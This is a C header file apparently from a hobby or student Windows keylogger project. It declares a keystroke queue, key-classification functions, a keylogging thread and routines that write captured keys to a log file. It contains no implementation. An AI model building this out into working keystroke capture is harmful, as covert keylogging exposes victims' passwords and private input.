#ifndef SETTINGS_H
#define SETTINGS_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <string.h>
#include <time.h>

/* macros */

#define MAX_LINE_LENGTH 255
#define DEST_FILE "src/logs/dest.txt"
#define WAIT_SECS 5


/* queue structures */

struct KeyLogNode 
{
    char data[20];
    struct KeyLogNode* next;
};

struct KeyLogQueue
{
    struct KeyLogNode* first; 
    struct KeyLogNode* last;
};


/* queue prototypes */

struct KeyLogQueue* createKeyLogQueue();

struct KeyLogNode* newKeyLogNode(char* data);

void insertKeyLogNode (struct KeyLogQueue* q, char* data);

struct KeyLogNode* DequeueKeyLogNode (struct KeyLogQueue* q);

/* readfile prototypes */

int read_file (char* toReadName);

int write_file (char* toReadName, struct KeyLogQueue* q, int firstCall);

/* keylogger prototypes */

int isAlphabetKey(int key);

int isShiftCombKey(int key);

int isShiftSpecialCombKey1(int key);

int isShiftSpecialCombKey2(int key);

int getKey(struct KeyLogQueue* q, char* key);

void myKeyLogger (struct KeyLogQueue* q);

DWORD WINAPI myThreadFun(void* arg);

HANDLE startKeyLogger (struct KeyLogQueue* q);

#endif